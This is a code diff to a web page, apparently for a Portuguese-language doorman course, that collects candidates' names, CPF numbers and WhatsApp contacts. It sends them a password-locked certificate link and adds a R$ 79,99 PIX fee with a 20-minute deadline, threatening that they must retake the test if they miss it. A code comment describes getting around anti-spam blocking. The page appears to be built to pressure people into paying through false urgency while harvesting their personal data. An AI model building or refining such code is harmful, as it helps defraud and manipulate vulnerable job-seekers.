@@ -22,6 +22,7 @@
         .input-group { margin-bottom: 15px; }
         .input-group label { display: block; font-weight: bold; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        .aviso-taxa { color: #d9534f; font-weight: normal; background-color: #f2dede; padding: 15px; border-radius: 5px; border: 1px solid #ebccd1; margin-bottom: 15px; font-size: 0.95em; text-align: left; }
     </style>
 </head>
 <body>
@@ -106,6 +107,10 @@
                 <div class="input-group">
                     <label>WhatsApp (com DDD)</label>
                     <input type="tel" id="aluno-contato" placeholder="(11) 99999-9999" oninput="mascaraTelefone(this)" maxlength="15" required>
+                </div>
+                
+                <div class="aviso-taxa">
+                    ⚠️ <b>Atenção:</b> A taxa de emissão do certificado é de <b>R$ 79,99</b>. O código de pagamento enviado para o seu WhatsApp será válido por apenas <b>20 minutos</b>. Caso não seja pago neste prazo, será necessário refazer a prova.
                 </div>
 
                 <button type="button" style="background:#28a745" onclick="gerarCertificado()">Emitir Certificado</button>
@@ -195,16 +200,14 @@
             telefoneCandidato = '55' + telefoneCandidato;
         }
 
-        // NOVO NÚMERO DE SUPORTE ATUALIZADO
         const numeroSuporte = "5522992195418";
-        
         const linkDoPdf = "https://curso-prime.github.io/curso-porteiro/certificado_protegido_por_senha.pdf"; 
 
         // Mensagem enviada para o CANDIDATO
-        const textoCandidato = `Olá, ${nome}!\n\nParabéns! Seu certificado do curso de Porteiro foi emitido com sucesso. 🎓\n\n📥 *Para baixar o seu documento, clique no link abaixo:*\n${linkDoPdf}\n\n🔒 *Atenção:* O arquivo está protegido por senha para a sua segurança.\n\nEm instantes, nosso suporte enviará por aqui o código PIX para o pagamento da taxa de emissão.\n\nAssim que o seu pagamento for confirmado, você receberá automaticamente a senha para abrir o seu certificado!`;
+        const textoCandidato = `Olá, ${nome}!\n\nParabéns! Seu certificado do curso de Porteiro foi emitido com sucesso. 🎓\n\n📥 *Para baixar o seu documento, clique no link abaixo:*\n${linkDoPdf}\n\n🔒 *Atenção:* O arquivo está protegido por senha para a sua segurança.\n\nEm instantes, nosso suporte enviará por aqui o código PIX no valor de *R$ 79,99* para o pagamento da taxa de emissão.\n\n⏳ *IMPORTANTE:* O código de pagamento terá validade de *20 minutos*. Caso não seja pago neste prazo, será necessário refazer a prova.\n\nAssim que o pagamento for confirmado, você receberá automaticamente a senha para abrir o seu certificado!`;
 
         // MOMENTO 2: Mensagem enviada para o SUPORTE
-        const textoSuporte = `🚨 *NOVO CERTIFICADO EMITIDO* 🚨\n\n*Nome:* ${nome}\n*CPF:* ${cpf}\n*WhatsApp:* ${contato}\n*Nota:* ${porcentagemAtual}%\n\nO candidato já recebeu o link do PDF. Chame-o e envie o código PIX para cobrar a taxa!`;
+        const textoSuporte = `🚨 *NOVO CERTIFICADO EMITIDO* 🚨\n\n*Nome:* ${nome}\n*CPF:* ${cpf}\n*WhatsApp:* ${contato}\n*Nota:* ${porcentagemAtual}%\n\nO candidato já recebeu o link do PDF. Chame-o e envie o código PIX (R$ 79,99) para cobrar a taxa! (Lembrando o prazo de 20 min)`;
 
         // Modificado para evitar bloqueio da API (Anti-Spam). 
         // Dispara para o candidato e aguarda 1.5 segundos para disparar para o suporte.
